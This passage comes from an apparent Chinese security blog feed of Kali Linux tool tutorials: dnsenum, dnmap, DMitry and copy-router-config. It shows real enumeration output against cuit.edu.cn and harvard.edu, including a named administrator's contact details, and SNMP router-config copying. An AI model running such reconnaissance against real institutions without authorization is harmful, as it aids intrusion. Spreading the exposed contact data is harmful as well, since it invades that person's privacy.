class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnsenum -f possible_subdomain.txt --subfile subdomain.txt --threads 2 -w -r cuit.edu.cn</div><div class="line">dnsenum.pl VERSION:1.2.3</div><div class="line">Warning: can't load Net::Whois::IP module, whois queries disabled.</div><div class="line"></div><div class="line">-----   cuit.edu.cn   -----</div><div class="line"></div><div class="line"></div><div class="line">Host's addresses:</div><div class="line">__________________</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">Name Servers:</div><div class="line">______________</div><div class="line"></div><div class="line">dns.cuit.edu.cn.                         5        IN    A        210.41.224.33</div><div class="line"></div><div class="line"></div><div class="line">Mail (MX) Servers:</div><div class="line">___________________</div><div class="line"></div><div class="line">mailw.cuit.edu.cn.                       5        IN    A        210.41.224.45</div><div class="line"></div><div class="line"></div><div class="line">Trying Zone Transfers and getting Bind Versions:</div><div class="line">_________________________________________________</div><div class="line"></div><div class="line">unresolvable name: dns2.cuit.edu.cn at /usr/bin/dnsenum line 842 thread 2.</div><div class="line"></div><div class="line">Trying Zone Transfer for cuit.edu.cn on dns2.cuit.edu.cn ... </div><div class="line">AXFR record query failed: no nameservers</div><div class="line"></div><div class="line">Trying Zone Transfer for cuit.edu.cn on dns.cuit.edu.cn ... </div><div class="line">AXFR record query failed: REFUSED</div><div class="line"></div><div class="line"></div><div class="line">Brute forcing with possible_subdomain.txt:</div><div class="line">___________________________________________</div><div class="line"></div><div class="line">www.cuit.edu.cn.                         5        IN    A        210.41.224.132</div><div class="line">wlzf.cuit.edu.cn.                        5        IN    A        210.41.225.229</div><div class="line">acm.cuit.edu.cn.                         5        IN    A        210.41.225.250</div><div class="line">wlcc.cuit.edu.cn.                        5        IN    A        210.41.228.67</div><div class="line">jhcwc.cuit.edu.cn.                       5        IN    A        210.41.224.220</div><div class="line">bylw.cuit.edu.cn.                        5        IN    A        210.41.224.237</div><div class="line">pkxt.cuit.edu.cn.                        5        IN    A        210.41.229.132</div><div class="line">pan.cuit.edu.cn.                         5        IN    A        210.41.224.210</div><div class="line">dzgcxy.cuit.edu.cn.                      5        IN    A        210.41.224.220</div><div class="line">kzgcxy.cuit.edu.cn.                      5        IN    A        210.41.224.220</div><div class="line">yjsc.cuit.edu.cn.                        5        IN    A        210.41.225.22</div><div class="line">hqc.cuit.edu.cn.                         5        IN    A        210.41.224.220</div><div class="line">wpgz.cuit.edu.cn.                        5        IN    A        210.41.229.135</div><div class="line">jszx.cuit.edu.cn.                        5        IN    A        210.41.225.21</div><div class="line">xyw.cuit.edu.cn.                         5        IN    A        210.41.224.220</div><div class="line">gjjl.cuit.edu.cn.                        5        IN    A        210.41.224.220</div><div class="line">math.cuit.edu.cn.                        5        IN    A        210.41.224.220</div><div class="line">jwc.cuit.edu.cn.                         5        IN    A        210.41.225.108</div><div class="line">jxpt.cuit.edu.cn.                        5        IN    A        210.41.228.119</div><div class="line">wlcc.cuit.edu.cn.                        5        IN    A        210.41.228.67</div><div class="line">xsc.cuit.edu.cn.                         5        IN    A        210.41.224.206</div><div class="line">exam.cuit.edu.cn.                        5        IN    A        222.18.158.220</div><div class="line"></div><div class="line"></div><div class="line">Performing recursion:</div><div class="line">______________________</div><div class="line"></div><div class="line"></div><div class="line"> ---- Checking subdomains NS records ----</div><div class="line"></div><div class="line">  Can't perform recursion no NS records.</div><div class="line"></div><div class="line"></div><div class="line">cuit.edu.cn class C netranges:</div><div class="line">_______________________________</div><div class="line"></div><div class="line"> 210.41.224.0/24</div><div class="line"> 210.41.225.0/24</div><div class="line"> 210.41.228.0/24</div><div class="line"> 210.41.229.0/24</div><div class="line"> 222.18.158.0/24</div><div class="line"></div><div class="line"></div><div class="line">Performing reverse lookup on 1280 ip addresses:</div><div class="line">________________________________________________</div><div class="line"></div><div class="line">34.224.41.210.in-addr.arpa.              86400    IN    PTR      dnsu.cuit.edu.cn.</div><div class="line">36.224.41.210.in-addr.arpa.              86400    IN    PTR      dns.cuit.edu.cn.</div><div class="line">40.224.41.210.in-addr.arpa.              86400    IN    PTR      jwc.cuit.edu.cn.</div><div class="line">130.224.41.210.in-addr.arpa.             86400    IN    PTR      www.cuit.edu.cn.</div><div class="line">131.224.41.210.in-addr.arpa.             86400    IN    PTR      ftp.cuit.edu.cn.</div><div class="line">130.224.41.210.in-addr.arpa.             86400    IN    PTR      dep.cuit.edu.cn.</div><div class="line">206.224.41.210.in-addr.arpa.             86400    IN    PTR      xsc.cuit.edu.cn.</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> dns </tag>
            
            <tag> 探测 </tag>
            
            <tag> dnsenum </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之dnmap]]></title>
      <url>/2016/10/20/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bdnmap/</url>
      <content type="html"><![CDATA[<h2 id="0x00-dnmap介绍"><a href="#0x00-dnmap介绍" class="headerlink" title="0x00 dnmap介绍"></a>0x00 dnmap介绍</h2><p>dnmap（distributed nmap）是一款基于nmap的分布式扫描工具，它能够用一个集群来对另外一个大型集群网络进行扫描。<br>dnmap采用的是客户端/服务器体系结构，服务端主要是用来分发任务和汇总扫描状态，客户端主要用来执行扫描任务和记录自身的扫描状态。<br>该工具主要用于你想一个大型集群网络进行扫描，你自己拥有一个集群（肉鸡）的资源或者你的小伙伴想帮你的情况。</p><p>工具来源： <a href="http://mateslab.weebly.com/dnmap-the-distributed-nmap.html" target="_blank" rel="external">http://mateslab.weebly.com/dnmap-the-distributed-nmap.html</a></p><p><a href="http://sourceforge.net/projects/dnmap/" target="_blank" rel="external">dnmap主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/dnmap.git;a=summary" target="_blank" rel="external">Kali dnmap Repo仓库</a></p><ul><li>作者：www.mateslab.com.ar</li><li>证书：GPLv3</li></ul><h2 id="0x01-dnmap-client功能"><a href="#0x01-dnmap-client功能" class="headerlink" title="0x01 dnmap_client功能"></a>0x01 dnmap_client功能</h2><p>dnmap_client - 分布式nmap框架（客户端）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnmap_client -h</div><div class="line">+----------------------------------------------------------------------+</div><div class="line">| dnmap Client Version 0.6                                             |</div><div class="line">| This program is free software; you can redistribute it and/or modify |</div><div class="line">| it under the terms of the GNU General Public License as published by |</div><div class="line">| the Free Software Foundation; either version 2 of the License, or    |</div><div class="line">| (at your option) any later version.                                  |</div><div class="line">|                                                                      |</div><div class="line">| Author: Garcia Sebastian, eldraco@gmail.com                          |</div><div class="line">| www.mateslab.com.ar                                                  |</div><div class="line">+----------------------------------------------------------------------+</div><div class="line"></div><div class="line">用法: /usr/bin/dnmap_client &lt;选项&gt;</div><div class="line">选项:</div><div class="line">  -s, --server-ip        dnmap服务器的IP地址</div><div class="line">  -p, --server-port      dnmap服务器的IP地址端口，默认46001</div><div class="line">  -a, --alias            您的别名，以便我们可以信贷给您的帮助，可选</div><div class="line">  -d, --debug            调试</div><div class="line">  -m, --max-rate         强制命令nmap最多使用最大速率，当nmap下来时添加--max-rate参数很管用</div></pre></td></tr></table></figure><h2 id="0x02-dnmap-server功能"><a href="#0x02-dnmap-server功能" class="headerlink" title="0x02 dnmap_server功能"></a>0x02 dnmap_server功能</h2><p>dnmap_server - 分布式nmap框架（服务端）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnmap_server -h</div><div class="line">+----------------------------------------------------------------------+</div><div class="line">| dnmap_server Version 0.6                                             |</div><div class="line">| This program is free software; you can redistribute it and/or modify |</div><div class="line">| it under the terms of the GNU General Public License as published by |</div><div class="line">| the Free Software Foundation; either version 2 of the License, or    |</div><div class="line">| (at your option) any later version.                                  |</div><div class="line">|                                                                      |</div><div class="line">| Author: Garcia Sebastian, eldraco@gmail.com                          |</div><div class="line">| www.mateslab.com.ar                                                  |</div><div class="line">+----------------------------------------------------------------------+</div><div class="line"></div><div class="line">用法: /usr/bin/dnmap_server &lt;选项&gt;</div><div class="line">选项:</div><div class="line">  -f, --nmap-commands        Nmap命令文件</div><div class="line">  -p, --port                 监听连接的TCP端口</div><div class="line">  -L, --log-file             日志文件，默认为/var/log/dnmap_server.conf</div><div class="line">  -l, --log-level            日志记录级别，默认详细</div><div class="line">  -v, --verbose_level        显示执行详细级别(1-5)，默认1，级别0表示无输出</div><div class="line">  -t, --client-timeout       客服端超时时间</div><div class="line">  -s, --sort                 用于对静态值进行排序的字段。 您可以选择：Alias, #Commands, UpTime, RunCmdXMin, AvrCmdXMin, Status</div><div class="line">  -P, --pem-file             pem文件用于TLS连接，默认情况下，我们使用当前目录中的服务器提供的server.pem文件</div><div class="line"></div><div class="line">dnmap_server使用'&lt;nmap-commands-file-name&gt; .dnmaptrace'文件知道它从读取nmap命令文件中继续的地方，如果你想重新开始，只需删除'&lt;nmap-commands-file-name&gt; .dnmaptrace'文件即可。</div></pre></td></tr></table></figure><h2 id="0x03-dnmap-client用法示例"><a href="#0x03-dnmap-client用法示例" class="headerlink" title="0x03 dnmap_client用法示例"></a>0x03 dnmap_client用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">root@kali:~# echo "nmap -F 192.168.1.0/24 -v -n -oA sub1" &gt;&gt; dnmap.txt</div><div class="line">root@kali:~# echo "nmap -F 192.168.0.0/24 -v -n -oA sub0" &gt;&gt; dnmap.txt</div><div class="line">root@kali:~# dnmap_server -f dnmap.txt</div><div class="line">+----------------------------------------------------------------------+</div><div class="line">| dnmap_server Version 0.6                                             |</div><div class="line">| This program is free software; you can redistribute it and/or modify |</div><div class="line">| it under the terms of the GNU General Public License as published by |</div><div class="line">| the Free Software Foundation; either version 2 of the License, or    |</div><div class="line">| (at your option) any later version.                                  |</div><div class="line">|                                                                      |</div><div class="line">| Author: Garcia Sebastian, eldraco@gmail.com                          |</div><div class="line">| www.mateslab.com.ar                                                  |</div><div class="line">+----------------------------------------------------------------------+</div><div class="line"></div><div class="line">=| MET:0:00:00.000544 | Amount of Online clients: 0 |=</div></pre></td></tr></table></figure><p>0x04 dnmap_server用法示例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnmap_client -s 192.168.1.15 -a dnmap-client1</div><div class="line">+----------------------------------------------------------------------+</div><div class="line">| dnmap Client Version 0.6                                             |</div><div class="line">| This program is free software; you can redistribute it and/or modify |</div><div class="line">| it under the terms of the GNU General Public License as published by |</div><div class="line">| the Free Software Foundation; either version 2 of the License, or    |</div><div class="line">| (at your option) any later version.                                  |</div><div class="line">|                                                                      |</div><div class="line">| Author: Garcia Sebastian, eldraco@gmail.com                          |</div><div class="line">| www.mateslab.com.ar                                                  |</div><div class="line">+----------------------------------------------------------------------+</div><div class="line"></div><div class="line">Client Started...</div><div class="line">Nmap output files stored in 'nmap_output' directory...</div><div class="line">Starting connection...</div><div class="line">Client connected succesfully...</div><div class="line">Waiting for more commands....</div><div class="line">        Command Executed: nmap -F 192.168.1.0/24 -v -n -oA sub1</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> 端口扫描 </tag>
            
            <tag> portscanning </tag>
            
            <tag> dnmap </tag>
            
            <tag> 探测 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之DMitry]]></title>
      <url>/2016/10/20/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BDMitry/</url>
      <content type="html"><![CDATA[<h2 id="0x00-DMitry介绍"><a href="#0x00-DMitry介绍" class="headerlink" title="0x00 DMitry介绍"></a>0x00 DMitry介绍</h2><p>DMitry(Deepmagic Information Gathering Tools 深度信息收集工具)是一个linux下用C语言写的工具。它能够尽可能的获取指定主机目标的信息。基础功能是获取目标的子域名，Email地址，运行时间相关信息，tcp端口，whois信息等等。</p><p>特性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">- 软件开源</div><div class="line">- 可以同时进行一系列的whois查询</div><div class="line">- 获取运行时的数据，系统和服务器信息</div><div class="line">- 对指定的机器搜索获取其子域名</div><div class="line">- 在指定的主机上搜素Email</div><div class="line">- 对指定的主机搜索其开启的TCP端口</div><div class="line">- 有模块化系统可以让用户根据需要选择模块</div></pre></td></tr></table></figure><p>工具来源：<a href="http://mor-pah.net/software/dmitry-deepmagic-information-gathering-tool/" target="_blank" rel="external">http://mor-pah.net/software/dmitry-deepmagic-information-gathering-tool/</a></p><p><a href="http://mor-pah.net/software/dmitry-deepmagic-information-gathering-tool/" target="_blank" rel="external">DMitry主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/dmitry.git;a=summary" target="_blank" rel="external">Kali DMitry Repo仓库</a></p><ul><li>作者：James Greig</li><li>证书：GPLv3</li></ul><p><a href="https://asciinema.org/a/31154" target="_blank" rel="external">DMitry视频介绍</a></p><h2 id="0x01-DMitry功能"><a href="#0x01-DMitry功能" class="headerlink" title="0x01 DMitry功能"></a>0x01 DMitry功能</h2><p>DMitry - 深度信息收集工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dmitry</div><div class="line">Deepmagic Information Gathering Tool</div><div class="line">"There be some deep magic going on"</div><div class="line"></div><div class="line">用法：dmitry [-winsepfb] [-t 0-9] [-o %host.txt] host</div><div class="line">-o        将输出保存到%host.txt或由-o文件指定的文件</div><div class="line">-i        对主机的IP地址执行whois查找</div><div class="line">-w        对主机的域名执行whois查找</div><div class="line">-n        在Netcraft.com上检索主机信息</div><div class="line">-s        搜索的子域</div><div class="line">-e        搜索可能的电子邮件地址</div><div class="line">-p        在主机上执行TCP端口扫描</div><div class="line">* -f      在显示输出报告过滤端口的主机上执行TCP端口扫描</div><div class="line">* -b      读取从扫描端口接收的横幅</div><div class="line">* -t 0-9  设置扫描TCP端口时的TTL（默认值2）</div><div class="line">* 以上3个选项需要传递-p选项</div></pre></td></tr></table></figure><h2 id="0x02-DMitry用法示例"><a href="#0x02-DMitry用法示例" class="headerlink" title="0x02 DMitry用法示例"></a>0x02 DMitry用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dmitry -winsepo harvard.txt harvard.edu</div><div class="line">Deepmagic Information Gathering Tool</div><div class="line">"There be some deep magic going on"</div><div class="line"></div><div class="line">Writing output to 'harvard.txt'</div><div class="line"></div><div class="line">HostIP:52.87.36.185</div><div class="line">HostName:harvard.edu</div><div class="line"></div><div class="line">Gathered Inet-whois information for 52.87.36.185</div><div class="line">---------------------------------</div><div class="line"></div><div class="line"></div><div class="line">inetnum:        52.0.0.0 - 52.144.63.255</div><div class="line">netname:        NON-RIPE-NCC-MANAGED-ADDRESS-BLOCK</div><div class="line">descr:          IPv4 address block not managed by the RIPE NCC</div><div class="line">remarks:        ------------------------------------------------------</div><div class="line">remarks:</div><div class="line">remarks:        You can find the whois server to query, or the</div><div class="line">remarks:        IANA registry to query on this web page:</div><div class="line">remarks:        http://www.iana.org/assignments/ipv4-address-space</div><div class="line">remarks:</div><div class="line">remarks:        You can access databases of other RIRs at:</div><div class="line">remarks:</div><div class="line">remarks:        AFRINIC (Africa)</div><div class="line">remarks:        http://www.afrinic.net/ whois.afrinic.net</div><div class="line">remarks:</div><div class="line">remarks:        APNIC (Asia Pacific)</div><div class="line">remarks:        http://www.apnic.net/ whois.apnic.net</div><div class="line">remarks:</div><div class="line">remarks:        ARIN (Northern America)</div><div class="line">remarks:        http://www.arin.net/  whois.arin.net</div><div class="line">remarks:</div><div class="line">remarks:        LACNIC (Latin America and the Carribean)</div><div class="line">remarks:        http://www.lacnic.net/ whois.lacnic.net</div><div class="line">remarks:</div><div class="line">remarks:        IANA IPV4 Recovered Address Space</div><div class="line">remarks:        http://www.iana.org/assignments/ipv4-recovered-address-space/ipv4-recovered-address-space.xhtml</div><div class="line">remarks:</div><div class="line">remarks:        ------------------------------------------------------</div><div class="line">country:        EU # Country is really world wide</div><div class="line">admin-c:        IANA1-RIPE</div><div class="line">tech-c:         IANA1-RIPE</div><div class="line">status:         ALLOCATED UNSPECIFIED</div><div class="line">mnt-by:         RIPE-NCC-HM-MNT</div><div class="line">mnt-lower:      RIPE-NCC-HM-MNT</div><div class="line">mnt-routes:     RIPE-NCC-RPSL-MNT</div><div class="line">created:        2016-09-26T14:44:02Z</div><div class="line">last-modified:  2016-09-26T14:44:02Z</div><div class="line">source:         RIPE</div><div class="line"></div><div class="line">role:           Internet Assigned Numbers Authority</div><div class="line">address:        see http://www.iana.org.</div><div class="line">admin-c:        IANA1-RIPE</div><div class="line">tech-c:         IANA1-RIPE</div><div class="line">nic-hdl:        IANA1-RIPE</div><div class="line">remarks:        For more information on IANA services</div><div class="line">remarks:        go to IANA web site at http://www.iana.org.</div><div class="line">mnt-by:         RIPE-NCC-MNT</div><div class="line">created:        1970-01-01T00:00:00Z</div><div class="line">last-modified:  2001-09-22T09:31:27Z</div><div class="line">source:         RIPE # Filtered</div><div class="line"></div><div class="line"><span class="meta">%</span> This query was served by the RIPE Database Query Service version 1.87.4 (DB-1)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">Gathered Inic-whois information for harvard.edu</div><div class="line">---------------------------------</div><div class="line"></div><div class="line">Domain Name: HARVARD.EDU</div><div class="line"></div><div class="line">Registrant:</div><div class="line">   Harvard University</div><div class="line">   HUIT Network Services</div><div class="line">   60 Oxford Street</div><div class="line">   Cambridge, MA 02138</div><div class="line">   UNITED STATES</div><div class="line"></div><div class="line">Administrative Contact:</div><div class="line">   Luke Sullivan</div><div class="line">   Manager, Network Systems</div><div class="line">   Harvard University</div><div class="line">   60 Oxford Street</div><div class="line">   Cambridge, MA 02138</div><div class="line">   UNITED STATES</div><div class="line">   (617) 384-6640</div><div class="line">   luke_sullivan@harvard.edu</div><div class="line"></div><div class="line">Technical Contact:</div><div class="line">   Network Operations</div><div class="line">   Harvard University</div><div class="line">   HUIT Network Services</div><div class="line">   60 Oxford Street</div><div class="line">   Cambridge, MA 02138</div><div class="line">   UNITED STATES</div><div class="line">   (617) 495-7777</div><div class="line">   netmanager@harvard.edu</div><div class="line"></div><div class="line">Name Servers: </div><div class="line">   EXT-DNS-1.HARVARD.EDU      128.103.200.35</div><div class="line">   EXT-DNS-2.HARVARD.EDU      128.103.200.162</div><div class="line"></div><div class="line">Domain record activated:    27-Jun-1985</div><div class="line">Domain record last updated: 30-Dec-2015</div><div class="line">Domain expires:             31-Jul-2017</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">Gathered Netcraft information for harvard.edu</div><div class="line">---------------------------------</div><div class="line"></div><div class="line">Retrieving Netcraft.com information for harvard.edu</div><div class="line">Netcraft.com Information gathered</div><div class="line"></div><div class="line">Gathered Subdomain information for harvard.edu</div><div class="line">---------------------------------</div><div class="line">Searching Google.com:80...</div><div class="line">Unable to connect: Socket Connect Error</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> dmitry </tag>
            
            <tag> 端口扫描 </tag>
            
            <tag> portscanning </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集脆弱性分析之copy-router-config]]></title>
      <url>/2016/10/19/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%86%E5%BC%B1%E6%80%A7%E5%88%86%E6%9E%90%E4%B9%8Bcopy-router-config/</url>
      <content type="html"><![CDATA[<h2 id="0x00-copy-router-config介绍"><a href="#0x00-copy-router-config介绍" class="headerlink" title="0x00 copy-router-config介绍"></a>0x00 copy-router-config介绍</h2><p>从运行SNMP的思科设备复制配置文件</p><p>工具来源：braa README</p><p><a href="http://www.offensive-security.com/" target="_blank" rel="external">copy-router-config主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/copy-router-config.git;a=summary" target="_blank" rel="external">Kali copy-router-config Repo仓库</a></p><ul><li>作者：muts</li><li>证书：GPLv2</li></ul><h2 id="0x01-copy-router-config功能"><a href="#0x01-copy-router-config功能" class="headerlink" title="0x01 copy-router-config功能"></a>0x01 copy-router-config功能</h2><p>copy-router-config.pl - 通过SNMP协议复制Cisco配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@kali:~# copy-router-config.pl</div><div class="line"></div><div class="line"><span class="meta">#</span>#####################################################</div><div class="line"><span class="meta">#</span> Copy Cisco Router config  - Using SNMP</div><div class="line"><span class="meta">#</span> Hacked up by muts - muts@offensive-security.com</div><div class="line"><span class="meta">#</span>######################################################</div><div class="line"></div><div class="line">用法 : ./copy-copy-config.pl &lt;路由IP&gt; &lt;tftp服务器IP&gt; &lt;社区字符串&gt;</div><div class="line"></div><div class="line">确保TFTP服务器已设置，最好从/tmp运行！</div></pre></td></tr></table></figure><p>注：社区字符串（community string）是一个用在基于简单网络管理协议(SNMP)的管理系统的概念，是一个起着密码作用的文本串，其被用来鉴别在管理站点和一个包含SNMP信息的代理的路由器之间的信息发送。并将被发送到在管理器和代理之间的每个数据包。</p><h2 id="0x02-merge-router-config功能"><a href="#0x02-merge-router-config功能" class="headerlink" title="0x02 merge-router-config功能"></a>0x02 merge-router-config功能</h2><p>merge-router-config.pl - 通过SNMP协议合并Cisco配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@kali:~# merge-router-config.pl</div><div class="line"></div><div class="line"><span class="meta">#</span>#####################################################</div><div class="line"><span class="meta">#</span> Merge Cisco Router config  - Using SNMP</div><div class="line"><span class="meta">#</span> Hacked up by muts - muts@offensive-security.com</div><div class="line"><span class="meta">#</span>######################################################</div><div class="line"></div><div class="line">用法 : ./merge-copy-config.pl &lt;路由IP&gt; &lt;tftp服务器IP&gt; &lt;社区字符串&gt;</div><div class="line"></div><div class="line">确保TFTP服务器已设置，最好从/tmp运行！</div></pre></td></tr></table></figure><h2 id="0x03-copy-router-config用法示例"><a href="#0x03-copy-router-config用法示例" class="headerlink" title="0x03 copy-router-config用法示例"></a>0x03 copy-router-config用法示例</h2><p>将配置从路由器（192.168.1.1）复制到TFTP服务器（192.168.1.15），使用社区字符串（private）进行认证：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# copy-router-config.pl 192.168.1.1 192.168.1.15 private</div></pre></td></tr></table></figure><p></p><h2 id="0x04-merge-router-config用法示例"><a href="#0x04-merge-router-config用法示例" class="headerlink" title="0x04 merge-router-config用法示例"></a>0x04 merge-router-config用法示例</h2><p>将配置从路由器（192.168.1.1）合并到TFTP服务器（192.168.1.15），使用社区字符串（private）：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# merge-router-config.pl 192.168.1.1 192.168.1.15 private</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> snmp </tag>
            
            <tag> copy-router-config </tag>
            
            <tag> vulnanalysis </tag>
            
            <tag> networking </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之Cookie Cadger]]></title>
      <url>/2016/10/19/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCookie-Cadger/</url>
